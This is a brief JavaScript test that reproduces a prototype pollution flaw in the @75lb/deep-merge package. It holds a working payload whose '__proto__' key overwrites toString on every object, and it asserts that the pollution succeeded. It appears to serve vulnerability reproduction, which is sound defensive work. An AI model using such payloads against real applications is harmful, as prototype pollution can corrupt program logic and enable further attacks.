test("Prototype pollution in @75lb/deep-merge", () => {
  const deep_merge = require('@75lb/deep-merge');

  let payload = { ["__proto__"]: { "toString": "polluted" } };

  expect({}.toString).toBe({}.toString);

  deep_merge.default({}, payload);

  expect({}.toString).toBe("polluted");
});
